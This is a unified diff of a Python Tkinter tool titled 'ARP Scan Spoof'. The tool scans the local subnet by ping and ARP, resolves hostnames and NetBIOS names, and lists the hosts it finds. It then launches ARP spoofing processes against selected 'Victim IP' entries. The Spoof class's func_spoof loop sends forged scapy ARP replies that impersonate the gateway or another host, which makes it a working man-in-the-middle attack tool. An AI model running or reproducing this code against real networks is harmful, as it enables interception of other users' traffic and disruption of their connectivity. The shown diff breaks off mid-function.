@@ -39,28 +39,29 @@ def broadcast(red,mask):
 	return bin2addr(broadcast_bin)
 
 def get_hostname(ip,gw,send_end):
-	lista_names = []
 	try:
 		answer = subprocess.check_output(["nslookup",ip,gw])
 		if re.findall("name =(.+)",answer):
 			name = re.findall("name =(.+)",answer)[0].replace(" ","")
-			lista_names.append(name)
+			hostname = name
 		else:
-			lista_names.append("Unknow")
+			hostname = "Unknow"
 
 	except:
-		lista_names.append("Unknow")
+		hostname = "None"
+	send_end.send(hostname)
+
+def get_netbios(ip,send_end):
 	try:
 		nmblookup = subprocess.check_output(["nmblookup","-A",ip])
 		if re.findall("(.+)<00>",nmblookup):
 			name_nmb = re.findall("(.+)<00>",nmblookup)[0].replace(" ","").replace("\t","")
-			lista_names.append(name_nmb)
+			netbios = name_nmb
 		else:
-			lista_names.append("Unknow")
+			netbios = "Unknow"
 	except:
-		lista_names.append("Unknow")
-
-	send_end.send(lista_names)
+		netbios = "None"
+	send_end.send(netbios)
 
 def config_iface(iface):
 	global interfaces
@@ -108,17 +109,373 @@ def init():
 		else:	
 			print "No Network configuration"
 			return 0
+	
+class App():
+	def __init__(self):
 
-def func_spoof(ip_v,gw,mac):
-	arpfake = ARP()
-	arpfake.op = 2
-	arpfake.psrc = gw
-	arpfake.pdst = ip_v
-	arpfake.hwdst = mac
-	arpfake.show()
-	while 1:
-		send(arpfake,verbose=0)
-		time.sleep(0.5)
+		self.escaneando = False
+
+		self.equipos_escaneo = []
+		self.hosts = []
+		self.host_s = None
+		self.spoofs = []
+		self.spoof_s = None
+		self.exit = 0
+		
+		#ROOT
+
+		self.root = Tk()
+		self.root.title("ARP Scan Spoof")
+		self.frame = Frame(borderwidth=2,relief="groove")
+		self.frame.grid(row=0,column=0,columnspan=2,sticky=W+E,padx=5,pady=5)
+
+		self.Iinterfaces = InfoInterfaces(self)
+
+		self.barra_escaneo = Progressbar(self.frame,orient="horizontal",maximum=100)
+		self.barra_escaneo.grid(column=0,row=8,columnspan=2,padx=5,pady=10,sticky=W+E)
+
+		self.root.resizable(width=True,height=True)
+		self.root.minsize(width=650, height=550)
+
+		self.root.rowconfigure(1, weight=1)
+		self.root.rowconfigure(2, weight=1)
+		self.root.columnconfigure(0, weight=1)
+		
+		#FRAME EQUIPOS
+
+		self.frame_equipos = Frame(borderwidth=2,relief="groove",height=50)
+		self.frame_equipos.grid(row=1,column=0,sticky=W+E+N+S,padx=5,pady=5)
+
+		columnas_host = ["IP","MAC","NS","NetBIOS"]
+		self.treeview_hosts = Treeview(self.frame_equipos,columns=columnas_host,show="headings",height=6)
+		for c in columnas_host:
+			self.treeview_hosts.heading(c,text=c)
+			self.treeview_hosts.column(c,width=150)
+			self.treeview_hosts.column(c,minwidth=50)
+		self.treeview_hosts.grid(row=0,column=0,sticky=W+E+N+S,padx=5,pady=5)
+
+		self.treeview_hosts.tag_configure("par", background="#F2F2F2")
+		self.treeview_hosts.tag_configure("selec", foreground="darkred")
+
+		self.treeview_hosts.bind("<<TreeviewSelect>>",self.select_host)
+
+		scroll_y_fe = Scrollbar(self.frame_equipos,orient=VERTICAL, command=self.treeview_hosts.yview)
+		self.treeview_hosts["yscroll"] = scroll_y_fe.set
+		scroll_y_fe.grid(row=0,column=1,sticky=N+S)
+
+		scroll_x_fe = Scrollbar(self.frame_equipos,orient=HORIZONTAL, command=self.treeview_hosts.xview)
+		self.treeview_hosts["xscroll"] = scroll_x_fe.set
+		scroll_x_fe.grid(row=1,column=0,sticky=W+E)
+
+		self.frame_equipos.columnconfigure(0,weight=1)
+		self.frame_equipos.rowconfigure(0,weight=1)
+
+		#FRAME BUTTON SPOOF
+
+		self.frame_spoof = Frame(borderwidth=2,relief="groove",width=180,height=50)
+		self.frame_spoof.grid(row=1,column=1,sticky=W+E+N+S,padx=5,pady=5)
+
+		self.ip_changed_combobox = Combobox(self.frame_spoof,state="readonly")
+		self.mac_new_combobox = Combobox(self.frame_spoof,state="readonly")
+
+		self.ip_changed_combobox["values"] = self.Iinterfaces.gateway
+		self.mac_new_combobox["values"] = self.Iinterfaces.mac
+
+		self.ip_changed_combobox.current(0)
+		self.mac_new_combobox.current(0)
+
+		self.ip_c_select = self.Iinterfaces.gateway
+		self.new_mac_select = self.Iinterfaces.mac
+
+		self.ip_changed_combobox.bind("<<ComboboxSelected>>", self.select_ip_c)
+		self.mac_new_combobox.bind("<<ComboboxSelected>>", self.select_mac_new)
+
+		self.button_spoof = Button(self.frame_spoof,state="disabled", text="Spoof",
+			command=lambda: self.launch_spoof(self.host_s.ip,self.ip_c_select,self.new_mac_select))
+
+		Label(self.frame_spoof,text="IP Changed:").grid(row=0,column=0,padx=5,pady=5,sticky=W+E)
+		Label(self.frame_spoof,text="New MAC:").grid(row=2,column=0,padx=5,pady=5,sticky=W+E)
+		self.ip_changed_combobox.grid(row=1,column=0,sticky=W+E,padx=5,pady=5)
+		self.mac_new_combobox.grid(row=3,column=0,sticky=W+E,padx=5,pady=5)
+		self.button_spoof.grid(row=4,column=0,sticky=W+E,padx=5,pady=10)
+
+		#FRAME HOSTS SPOOFING
+
+		self.frame_hosts_spoofing = Frame(borderwidth=2,relief="groove",height=50)
+		self.frame_hosts_spoofing.grid(row=2,column=0,sticky=W+E+N+S,padx=5,pady=5)
+
+		columnas_host_spoofing = ["Victim IP","IP Changed","New MAC","Time Lapse"]
+		self.treeview_hosts_spoofing = Treeview(self.frame_hosts_spoofing,
+			columns=columnas_host_spoofing,show="headings",height=6)
+		for c in columnas_host_spoofing:
+			self.treeview_hosts_spoofing.heading(c,text=c)
+			self.treeview_hosts_spoofing.column(c,width=150)
+			self.treeview_hosts_spoofing.column(c,minwidth=50)
+		self.treeview_hosts_spoofing.grid(row=0,column=0,sticky=W+E+N+S,padx=5,pady=5)
+
+		self.treeview_hosts_spoofing.tag_configure("par", background="#F2F2F2")
+		self.treeview_hosts_spoofing.tag_configure("selec", foreground="darkred")
+
+		self.treeview_hosts_spoofing.bind("<<TreeviewSelect>>",self.select_spoof)
+
+		scroll_y_hs = Scrollbar(self.frame_hosts_spoofing,orient=VERTICAL, command=self.treeview_hosts_spoofing.yview)
+		self.treeview_hosts_spoofing["yscroll"] = scroll_y_hs.set
+		scroll_y_hs.grid(row=0,column=1,sticky=N+S)
+
+		scroll_x_hs = Scrollbar(self.frame_hosts_spoofing,orient=HORIZONTAL, command=self.treeview_hosts_spoofing.xview)
+		self.treeview_hosts_spoofing["xscroll"] = scroll_x_hs.set
+		scroll_x_hs.grid(row=1,column=0,sticky=W+E)
+
+		self.frame_hosts_spoofing.columnconfigure(0,weight=1)
+		self.frame_hosts_spoofing.rowconfigure(0,weight=1)
+
+		#FRAME CONFIG SPOOFING
+
+		self.frame_config_spoof = Frame(borderwidth=2,relief="groove",width=180,height=50)
+		self.frame_config_spoof.grid(row=2,column=1,sticky=W+E+N+S,padx=5,pady=5)
+
+		Label(self.frame_config_spoof,text="Time Lapse:").grid(row=0,column=0,sticky=W+E,padx=5,pady=5)
+
+		self.entry_time_lapse = Entry(self.frame_config_spoof,state="disabled",width=5)
+		self.entry_time_lapse.grid(row=1,column=0,sticky=W+E,padx=5,pady=5)
+
+		self.button_time_lapse = Button(self.frame_config_spoof,state="disabled",text="Change",
+			command=lambda: self.spoof_s.change_time_lapse(self,self.entry_time_lapse.get()))
+		self.button_time_lapse.grid(row=1,column=1,sticky=W,padx=5,pady=5)
+		
+		self.button_delete_spoof = Button(self.frame_config_spoof,state="disabled",text="Delete",
+			command=lambda: self.spoof_s.stop(self))
+
+		self.button_delete_spoof.grid(row=2,column=0,columnspan=2,sticky=W+E,padx=5,pady=10)
+
+		self.time_update()
+
+		self.root.mainloop()
+
+		self.exit = 1
+
+		for spoof in self.spoofs:
+			spoof.stop(self)
+
+	def select_ip_c(self,event):
+		self.ip_c_select = self.ip_changed_combobox["values"][self.ip_changed_combobox.current()]
+	
+	def select_mac_new(self,event):
+		self.new_mac_select = self.mac_new_combobox["values"][self.mac_new_combobox.current()]
+
+	def select_spoof(self,event):
+		id_s = self.treeview_hosts_spoofing.focus()
+		if id_s:
+			datos_spoof_s = self.treeview_hosts_spoofing.item(id_s)["values"]
+			n_l = int(id_s)
+			self.spoof_s = self.spoofs[n_l]
+			#for spoof in self.spoofs:
+			#	if "selec" in spoof.tagx:
+			#		spoof.tagx.remove("selec")
+			self.spoof_s.tagx.append("selec")
+			self.treeview_hosts_spoofing.item(id_s,text="",values=datos_spoof_s,tags=(self.spoof_s.tagx))
+			#########
+			self.button_delete_spoof.config(state="normal")
+			self.entry_time_lapse.config(state="normal")
+			self.button_time_lapse.config(state="normal")
+			self.entry_time_lapse.delete(0,END)
+			self.entry_time_lapse.insert(0,str(self.spoof_s.time_lapse))
+	
+	def select_host(self,event):
+		id_h = self.treeview_hosts.focus()
+		if id_h:
+			datos_host_s = self.treeview_hosts.item(id_h)["values"]
+			n_l = int(id_h)
+			self.host_s = self.hosts[n_l]
+			#for host in self.hosts:
+			#	if "selec" in host.tagx:
+			#		host.tagx.remove("selec")
+			#self.host_s.tagx.append("selec")
+			self.button_spoof.config(state="normal")
+
+	def onFrameConfigure(self, event):
+		canvas_height = self.canvas.winfo_height()
+		frame_equipos_height = event.height
+		self.canvas.configure(scrollregion=self.canvas.bbox("all"))
+
+	def FrameWidth(self, event):
+		canvas_width = event.width-10
+		self.canvas.itemconfig(self.canvas_frame, width = canvas_width)
+
+	def show_arp_table(self,arp_scan_list,ping_scan_list):
+		lista_hosts = []
+		arp_table = subprocess.check_output(["arp","-n"])
+		arp_table = arp_table.split("\n")
+		arp_table = arp_table[1:len(arp_table)]
+		for host in arp_table:
+			h_list = host.split()
+			if len(h_list) == 5 and h_list[4] == self.Iinterfaces.interface_selec:
+				lista_hosts.append([h_list[0],h_list[2]])
+		for host in arp_scan_list:
+			if not host in lista_hosts:
+				lista_hosts.append(host)
+		for host in ping_scan_list:
+			if not host in [ip[0] for ip in lista_hosts]:
+				arp_table_host = subprocess.check_output(["arp","-n",host])
+				arp_table_host = arp_table_host.split("\n")
+				if len(arp_table_host) >= 2:
+					arp_t = arp_table_host[1].split()
+					if len(arp_t) == 5:
+						lista_hosts.append([arp_t[0],arp_t[2]]) 
+		return lista_hosts
+
+	def ping_hosts(self,red,broadcast):
+		lista_procesos = []
+		pipe_list = []
+		ip_l = red.split(".")
+		broadcast_l = broadcast.split(".")
+		ip_l[3] = str(int(ip_l[3])+1)
+		while ip_l != broadcast_l:
+			recv_end, send_end = multiprocessing.Pipe(False)
+			p = multiprocessing.Process(target=self.ping_h, args=(".".join(ip_l),send_end))
+			lista_procesos.append(p)
+			pipe_list.append(recv_end)
+			p.start()
+			for n in range(4):
+				if ip_l[n] == "255":
+					for n in range(4)[n:4]:
+						ip_l[n] = "0"
+					ip_l[n-1] = str(int(ip_l[n-1])+1)
+			ip_l[3] = str(int(ip_l[3])+1)
+		for proc in lista_procesos:
+			proc.join()
+		results = [x.recv() for x in pipe_list]
+		return [x for x in results if x]
+
+	def ping_h(self,ip,send_end):
+		ping = subprocess.Popen(["ping","-c 1",ip],stdout=PIPE,stderr=PIPE,stdin=PIPE)
+		ping_read = ping.stdout.read()
+		if re.findall("(\d) received",ping_read):
+			reply = int(re.findall("(\d) received",ping_read)[0])
+		else:
+			reply = False
+		if reply:
+			send_end.send(ip)
+		else:
+			send_end.send(False)
+
+	def launch_spoof(self,ip_v,ip_c,new_mac):
+		self.spoofs.append(Spoof(self,ip_v,ip_c,new_mac))
+
+	def escaneo(self):
+		if not self.escaneando:
+			for host in self.treeview_hosts.get_children():
+				self.treeview_hosts.delete(host)
+			for spoof in self.treeview_hosts_spoofing.get_children():
+				self.treeview_hosts_spoofing.delete(spoof)
+			for spoof in self.spoofs:
+				spoof.stop()
+			self.spoofs = []
+			Style().configure("Red.TButton", foreground="darkred")
+			self.escaneando = 1
+			self.Iinterfaces.escanear.config(style="Red.TButton")
+			self.button_spoof.config(state="disabled")
+			self.ip_changed_combobox["values"] = self.Iinterfaces.gateway
+			self.mac_new_combobox["values"] = self.Iinterfaces.mac
+			self.ip_changed_combobox.current(0)
+			self.mac_new_combobox.current(0)
+			self.equipos_escaneo = []
+			self.hosts = []
+			self.Iinterfaces.tipo_scan["text"] = "Ping Scan..."
+
+	def time_update(self):
+		if self.escaneando:
+			if self.escaneando == 1:
+				self.ping_host_list = self.ping_hosts(self.Iinterfaces.red,self.Iinterfaces.broadcast)
+				self.ping_host_list = [ip for ip in self.ping_host_list
+					 if ip not in [self.Iinterfaces.ip,self.Iinterfaces.gateway]]
+				self.escaneando += 1
+				self.barra_escaneo["value"] = 20
+				self.Iinterfaces.tipo_scan["text"] = "ARP Scan..."
+			elif self.escaneando == 2:
+				pdst_ip = self.Iinterfaces.ip+"/"+self.Iinterfaces.num_mask
+				alive,dead=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=pdst_ip),
+					timeout=1, verbose=0, iface=self.Iinterfaces.interface_selec)
+				hosts_list_scan = []
+				for i in range(0,len(alive)):
+					ip = alive[i][1].psrc
+					mac = alive[i][1].hwsrc
+					hosts_list_scan.append([ip,mac])
+				self.hosts_list_final = self.show_arp_table(hosts_list_scan,self.ping_host_list)
+				self.escaneando += 1
+				self.barra_escaneo["value"] = 40
+				self.Iinterfaces.tipo_scan["text"] = "Resolving Hostnames..."
+			elif self.escaneando == 3:
+				self.pipe_list_hostname = []
+				self.procesos_gethost = []
+				gw = self.Iinterfaces.gateway
+				for host in self.hosts_list_final:
+					ip = host[0]
+					mac = host[1]
+					self.equipos_escaneo.append([ip,mac])
+					recv_end, send_end = multiprocessing.Pipe(False)
+					p_hostname = multiprocessing.Process(target=get_hostname,args=(ip,gw,send_end))
+					self.procesos_gethost.append(p_hostname)
+					self.pipe_list_hostname.append(recv_end)
+					p_hostname.start()
+				self.escaneando += 1
+				self.barra_escaneo["value"] = 50
+			elif self.escaneando == 4:
+				self.pipe_list_netbios = []
+				self.procesos_getnetbios = []
+				gw = self.Iinterfaces.gateway
+				for host in self.hosts_list_final:
+					ip = host[0]
+					mac = host[1]
+					recv_end, send_end = multiprocessing.Pipe(False)
+					p_netbios = multiprocessing.Process(target=get_netbios,args=(ip,send_end))
+					self.procesos_getnetbios.append(p_netbios)
+					self.pipe_list_netbios.append(recv_end)
+					p_netbios.start()
+				self.escaneando += 1
+				self.barra_escaneo["value"] = 60
+			elif self.escaneando == 5:		
+				if self.procesos_gethost:
+					p_n = 0
+					for proc in self.procesos_gethost:
+						self.procesos_gethost[p_n].join()
+						p_n += 1
+					n_r = 0
+					self.hostnames = []
+					for equipo in self.equipos_escaneo:
+						self.hostnames.append(self.pipe_list_hostname[n_r].recv())
+						n_r += 1
+				self.escaneando += 1
+				self.barra_escaneo["value"] = 80
+				self.Iinterfaces.tipo_scan["text"] = "Resolving NetBIOS..."
+			elif self.escaneando == 6:		
+				if self.procesos_getnetbios:
+					p_n = 0
+					for proc in self.procesos_getnetbios:
+						self.procesos_getnetbios[p_n].join()
+						p_n += 1
+					n_r = 0
+					for equipo in self.equipos_escaneo:
+						hostname = self.hostnames[n_r]
+						netbios = self.pipe_list_netbios[n_r].recv()
+						self.hosts.append(Host(self,equipo[0],equipo[1],hostname,netbios,n_r+1))
+						n_r += 1
+				self.escaneando += 1
+				self.barra_escaneo["value"] = 90
+				self.Iinterfaces.tipo_scan["text"] = "Finish"
+			elif self.escaneando == 7:
+				self.escaneando = False
+				self.barra_escaneo["value"] = 0
+				Style().configure("Black.TButton", foreground="black")
+				self.Iinterfaces.escanear.config(style="Black.TButton")	
+				self.Iinterfaces.tipo_scan["text"] = ""
+				self.ip_changed_combobox["values"] = ([self.Iinterfaces.gateway]+
+					[x[0] for x in self.equipos_escaneo if not x[0] in self.ip_changed_combobox["values"]])
+				self.mac_new_combobox["values"] = ([self.Iinterfaces.mac]+
+					[x[1] for x in self.equipos_escaneo if not x[1] in self.mac_new_combobox["values"]])
+				self.ip_changed_combobox.current(0)
+				self.mac_new_combobox.current(0)
+		self.root.after(100,self.time_update)
 
 class InfoInterfaces():
 	def __init__(self,master):
@@ -142,52 +499,49 @@ class InfoInterfaces():
 		self.red = interfaces[self.interface_selec]["red"]
 		self.broadcast = interfaces[self.interface_selec]["broadcast"]
 
+		self.tipo_scan = Label(master.frame,text="")
+
 		self.mac_label =  Entry(master.frame)
-		self.mac_label.insert(0,self.mac)
-		self.mac_label.config(state="readonly")
+		self.write_entry(self.mac_label,self.mac)
 
 		self.ip_label =  Entry(master.frame)
-		self.ip_label.insert(0,self.ip)
-		self.ip_label.config(state="readonly")
+		self.write_entry(self.ip_label,self.ip)
 
 		self.mask_label = Entry(master.frame)
-		self.mask_label.insert(0,self.mask)
-		self.mask_label.config(state="readonly")
+		self.write_entry(self.mask_label,self.mask)
 
 		self.num_mask_label = Entry(master.frame)
-		self.num_mask_label.insert(0,"/"+self.num_mask)
-		self.num_mask_label.config(state="readonly")
+		self.write_entry(self.num_mask_label,self.num_mask)
 
 		self.gateway_label = Entry(master.frame)
-		self.gateway_label.insert(0,self.gateway)
-		self.gateway_label.config(state="readonly")
+		self.write_entry(self.gateway_label,self.gateway)
 
 		self.red_label = Entry(master.frame)
-		self.red_label.insert(0,self.red)
-		self.red_label.config(state="readonly")
+		self.write_entry(self.red_label,self.red)
 
 		self.broadcast_label = Entry(master.frame)
-		self.broadcast_label.insert(0,self.broadcast)
-		self.broadcast_label.config(state="readonly")
+		self.write_entry(self.broadcast_label,self.broadcast)
 
 		Label(master.frame,text="MAC:").grid(column=0,row=1,padx=5,pady=5,sticky=W)
 		Label(master.frame,text="IP:").grid(column=0,row=2,padx=5,pady=5,sticky=W)
 		Label(master.frame,text="NetMask:").grid(column=0,row=3,padx=5,pady=5,sticky=W)
-		Label(master.frame,text="Gateway:").grid(column=0,row=4,padx=5,pady=5,sticky=W)
-		Label(master.frame,text="Network:").grid(column=0,row=5,padx=5,pady=5,sticky=W)
-		Label(master.frame,text="Broadcast:").grid(column=0,row=6,padx=5,pady=5,sticky=W)
+
+		Label(master.frame,text="Gateway:").grid(column=2,row=1,padx=5,pady=5,sticky=W)
+		Label(master.frame,text="Network:").grid(column=2,row=2,padx=5,pady=5,sticky=W)
+		Label(master.frame,text="Broadcast:").grid(column=2,row=3,padx=5,pady=5,sticky=W)
 
 		self.mac_label.grid(column=1,row=1,padx=5,pady=5,sticky=W)
 		self.ip_label.grid(column=1,row=2,padx=5,pady=5,sticky=W)
 		self.mask_label.grid(column=1,row=3,padx=5,pady=5,sticky=W)
-		self.gateway_label.grid(column=1,row=4,padx=5,pady=5,sticky=W)
-		self.red_label.grid(column=1,row=5,padx=5,pady=5,sticky=W)
-		self.broadcast_label.grid(column=1,row=6,padx=5,pady=5,sticky=W)
 
-		#self.num_mask_label.grid(column=2,row=3,padx=5,pady=5,sticky=W)
+		self.gateway_label.grid(column=3,row=1,padx=5,pady=5,sticky=W)
+		self.red_label.grid(column=3,row=2,padx=5,pady=5,sticky=W)
+		self.broadcast_label.grid(column=3,row=3,padx=5,pady=5,sticky=W)
 
 		self.escanear = Button(master.frame,text="Escanear",command=master.escaneo)
 		self.escanear.grid(column=1,row=7,padx=5,pady=10,sticky=W)
+
+		self.tipo_scan.grid(column=2,row=8,columnspan=2,padx=5,pady=10,sticky=W)
 
 	def write_entry(self,entry,text):
 		entry.config(state="normal")
@@ -232,246 +586,70 @@ class Host():
 
 		self.ip = ip
 		self.mac = mac
+		self.tagx = []
+		if n_r%2 == 0:
+			self.tagx.append("par")
+		else:
+			self.tagx.append("impar")
+		master.treeview_hosts.insert("","end",iid=str(len(master.hosts)),
+			values=[ip,mac,hostname,netbios],tags=self.tagx)
+
+class Spoof():
+	def __init__(self,master,ip_v,ip_c,new_mac):
+		self.ip_v = ip_v
+		self.ip_c = ip_c
+		self.new_mac = new_mac
+		self.time_lapse = 1
+		self.tagx = []
+		if (len(master.spoofs)+1)%2 == 0:
+			self.tagx.append("par")
+		else:
+			self.tagx.append("impar")
+		master.treeview_hosts_spoofing.insert("","end",iid=str(len(master.spoofs)),
+			values=[self.ip_v,self.ip_c,self.new_mac,self.time_lapse],tags=self.tagx)
+		self.proceso = multiprocessing.Process(target=self.func_spoof)
+		self.proceso.start()
 	
-		self.label_ip_host = Entry(master.frame_equipos)
-		self.label_ip_host.insert(0,self.ip)
-		self.label_ip_host.config(state="readonly")
-
-		self.label_mac_host = Entry(master.frame_equipos)
-		self.label_mac_host.insert(0,self.mac)
-		self.label_mac_host.config(state="readonly")
-
-		self.label_hostname = Entry(master.frame_equipos)
-		self.label_hostname.insert(0,hostname)
-		self.label_hostname.config(state="readonly")
-
-		self.label_netbios = Entry(master.frame_equipos)
-		self.label_netbios.insert(0,netbios)
-		self.label_netbios.config(state="readonly")
-
-		self.button_spoof = Button(master.frame_equipos,text="Spoof",command=lambda: self.spoof(master,self.ip,self.mac))
-
-		self.label_ip_host.grid(row=n_r,column=0,padx=5,pady=5,sticky=W+E)
-		self.label_mac_host.grid(row=n_r,column=1,padx=5,pady=5,sticky=W+E)
-		self.label_hostname.grid(row=n_r,column=2,padx=5,pady=5,sticky=W+E)
-		self.label_netbios.grid(row=n_r,column=3,padx=5,pady=5,sticky=W+E)
-		self.button_spoof.grid(row=n_r,column=4,padx=5,pady=5,sticky=W+E)
-
-		self.proceso = None
-
-	def spoof(self,master,ip,mac):
-		if self.proceso:
-			self.button_spoof.config(text="Spoof")
-			self.button_spoof.config(style="Black.TButton")
-			self.label_ip_host.config(style="Black.TEntry")
-			self.label_mac_host.config(style="Black.TEntry")
-			self.label_hostname.config(style="Black.TEntry")
-			self.label_netbios.config(style="Black.TEntry")
+	def change_time_lapse(self,master,time):
+		if time.isdigit() and int(time) > 0:
+			self.time_lapse = int(time)
 			self.proceso.terminate()
 			self.proceso = None
-			print "Stop ARP Spoofing to", ip, mac
-		else:
-			self.button_spoof.config(style="Red.TButton")
-			self.button_spoof.config(text="Spoofing")
-			self.label_ip_host.config(style="Red.TEntry")
-			self.label_mac_host.config(style="Red.TEntry")
-			self.label_hostname.config(style="Red.TEntry")
-			self.label_netbios.config(style="Red.TEntry")
-			gw = master.Iinterfaces.gateway
-			mac = master.Iinterfaces.mac
-			self.proceso = multiprocessing.Process(target=func_spoof,args=(self.ip,gw,mac))
+			self.proceso = multiprocessing.Process(target=self.func_spoof)
 			self.proceso.start()
-			print "ARP Spoofing to ", ip, mac
+			id_s = int(master.treeview_hosts_spoofing.focus())
+			spoof_values = master.treeview_hosts_spoofing.item(id_s)["values"]
+			master.treeview_hosts_spoofing.item(id_s, text="",values=spoof_values[0:3]+[self.time_lapse])
+			
+
+	def func_spoof(self):
+		arpfake = ARP()
+		arpfake.op = 2
+		arpfake.psrc = self.ip_c
+		arpfake.pdst = self.ip_v
+		arpfake.hwdst = self.new_mac
+		arpfake.hwsrc = self.new_mac
+		#arpfake.show()
+		while 1:
+			#print self.ip_c,self.ip_v,self.new_mac,self.time_lapse
+			send(arpfake,verbose=0)
+			time.sleep(self.time_lapse)
+
+	def stop(self,master):
+		self.proceso.terminate()
+		self.proceso = None
+		if not master.exit:
+			id_s = int(master.treeview_hosts_spoofing.focus())
+			master.spoofs[id_s] = None
+			master.treeview_hosts_spoofing.selection_remove(id_s)
+			master.treeview_hosts_spoofing.delete(id_s)
+			master.button_delete_spoof.config(state="disabled")
+			master.entry_time_lapse.delete(0,END)
+			master.entry_time_lapse.config(state="disabled")
+			master.button_time_lapse.config(state="disabled")
 		
-class App():
-	def __init__(self):
-
-		self.root = Tk()
-		self.frame = Frame(borderwidth=2,relief="groove")
-		self.frame.grid(row=0,column=0,columnspan=2,sticky=W+E,padx=5,pady=5)
-
-		self.Iinterfaces = InfoInterfaces(self)
-
-		self.barra_escaneo = Progressbar(self.frame,orient="horizontal",maximum=100)
-		self.barra_escaneo.grid(column=0,row=8,columnspan=2,padx=5,pady=10,sticky=W+E)
-
-		self.canvas = Canvas(self.root, bd=0, highlightthickness=0)		
-		self.frame_equipos = Frame(self.canvas)
-		yscroll = Scrollbar(self.root,orient=VERTICAL,command=self.canvas.yview)
-		self.canvas.configure(yscrollcommand=yscroll.set)
-
-		self.frame_equipos.bind("<Configure>",self.onFrameConfigure)
-
-		self.canvas.bind('<Configure>', self.FrameWidth)
-
-		self.canvas.grid(row=1,column=0,sticky=N+W+E+S,padx=5,pady=5)
-		self.canvas_frame = self.canvas.create_window((0,0),window=self.frame_equipos, anchor=N)
-		yscroll.grid(row=1,column=1, sticky=N+S+E, pady=5, padx=3)
-
-		self.escaneando = False
-
-		self.equipos_escaneo = []
-		self.hosts = []
 		
-		self.root.resizable(width=True,height=True)
-		self.root.minsize(width=600, height=400)
 
-		self.root.rowconfigure(1, weight=1)
-		self.root.columnconfigure(0, weight=1)
-
-		self.frame_equipos.columnconfigure(0,weight=1)
-		self.frame_equipos.columnconfigure(1,weight=1)
-		self.frame_equipos.columnconfigure(2,weight=5)
-		self.frame_equipos.columnconfigure(3,weight=5)
-
-		self.time_update()
-
-		self.root.mainloop()
-
-	def time_update(self):
-		if self.escaneando:
-			if self.escaneando == 1:
-				self.ping_host_list = self.ping_hosts(self.Iinterfaces.red,self.Iinterfaces.broadcast)
-				self.ping_host_list = [ip for ip in self.ping_host_list if ip not in [self.Iinterfaces.ip,self.Iinterfaces.gateway] ]
-				print "Ping SCAN:", self.ping_host_list
-				self.escaneando += 1
-				self.barra_escaneo["value"] = 20
-			elif self.escaneando == 2:
-				pdst_ip = self.Iinterfaces.ip+"/"+self.Iinterfaces.num_mask
-				alive,dead=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=pdst_ip), timeout=1, verbose=0, iface=self.Iinterfaces.interface_selec)
-				hosts_list_scan = []
-				for i in range(0,len(alive)):
-					ip = alive[i][1].psrc
-					mac = alive[i][1].hwsrc
-					hosts_list_scan.append([ip,mac])
-				self.hosts_list_final = self.show_arp_table(hosts_list_scan,self.ping_host_list)
-				print "ARP Scan:", self.hosts_list_final
-				self.escaneando += 1
-				self.barra_escaneo["value"] = 50
-			elif self.escaneando == 3:
-				self.pipe_list = []
-				self.procesos_gethost = []
-				gw = self.Iinterfaces.gateway
-				for host in self.hosts_list_final:
-					ip = host[0]
-					mac = host[1]
-					if ip != gw:
-						self.equipos_escaneo.append([ip,mac])
-						recv_end, send_end = multiprocessing.Pipe(False)
-						p = multiprocessing.Process(target=get_hostname,args=(ip,gw,send_end))
-						self.procesos_gethost.append(p)
-						self.pipe_list.append(recv_end)
-						p.start()
-				self.escaneando += 1
-				self.barra_escaneo["value"] = 80
-			elif self.escaneando == 4:			
-				if self.procesos_gethost:
-					p_n = 0
-					for proc in self.procesos_gethost:
-						self.procesos_gethost[p_n].join()
-						p_n += 1
-					#Label(self.frame_equipos,text="IP",relief="groove").grid(row=0,column=0, sticky=W+E, pady=5, padx=3)
-					#Label(self.frame_equipos,text="MAC",relief="groove").grid(row=0,column=1, sticky=W+E, pady=5, padx=3)
-					#Label(self.frame_equipos,text="Hostname",relief="groove").grid(row=0,column=2, sticky=W+E, pady=5, padx=3)
-					#Label(self.frame_equipos,text="NetBIOS",relief="groove").grid(row=0,column=3, sticky=W+E, pady=5, padx=3)
-					n_r = 0
-					for equipo in self.equipos_escaneo:
-						list_names = self.pipe_list[n_r].recv()
-						hostname,netbios = list_names
-						self.hosts.append(Host(self,equipo[0],equipo[1],hostname,netbios,n_r+1))
-						n_r += 1
-				print "Escaneo Finalizado."
-				self.escaneando += 1
-				self.barra_escaneo["value"] = 0
-			elif self.escaneando == 5:
-				self.escaneando = False
-				self.barra_escaneo["value"] = 0
-				Style().configure("Black.TButton", foreground="black")
-				self.Iinterfaces.escanear.config(style="Black.TButton")		
-		self.root.after(500,self.time_update)
-	
-	def onFrameConfigure(self, event):
-		canvas_height = self.canvas.winfo_height()
-		frame_equipos_height = event.height
-		self.canvas.configure(scrollregion=self.canvas.bbox("all"))
-
-	def FrameWidth(self, event):
-		canvas_width = event.width-10
-		self.canvas.itemconfig(self.canvas_frame, width = canvas_width)
-
-	def show_arp_table(self,arp_scan_list,ping_scan_list):
-		lista_hosts = []
-		arp_table = subprocess.check_output(["arp","-n"])
-		arp_table = arp_table.split("\n")
-		arp_table = arp_table[1:len(arp_table)]
-		for host in arp_table:
-			h_list = host.split()
-			if len(h_list) == 5 and h_list[4] == self.Iinterfaces.interface_selec:
-				lista_hosts.append([h_list[0],h_list[2]])
-		for host in arp_scan_list:
-			if not host in lista_hosts:
-				lista_hosts.append(host)
-		for host in ping_scan_list:
-			if not host in [ip[0] for ip in lista_hosts]:
-				arp_table_host = subprocess.check_output(["arp","-n",host])
-				arp_table_host = arp_table_host.split("\n")
-				if len(arp_table_host) >= 2:
-					arp_t = arp_table_host[1].split()
-					if len(arp_t) == 5:
-						lista_hosts.append([arp_t[0],arp_t[2]]) 
-					
-		return lista_hosts
-
-	def ping_hosts(self,red,broadcast):
-		lista_procesos = []
-		pipe_list = []
-		ip_l = red.split(".")
-		broadcast_l = broadcast.split(".")
-		ip_l[3] = str(int(ip_l[3])+1)
-		while ip_l != broadcast_l:
-			recv_end, send_end = multiprocessing.Pipe(False)
-			p = multiprocessing.Process(target=self.ping_h, args=(".".join(ip_l),send_end))
-			lista_procesos.append(p)
-			pipe_list.append(recv_end)
-			p.start()
-			for n in range(4):
-				if ip_l[n] == "255":
-					for n in range(4)[n:4]:
-						ip_l[n] = "0"
-					ip_l[n-1] = str(int(ip_l[n-1])+1)
-			ip_l[3] = str(int(ip_l[3])+1)
-		for proc in lista_procesos:
-			proc.join()
-		results = [x.recv() for x in pipe_list]
-		return [x for x in results if x]
-
-	def ping_h(self,ip,send_end):
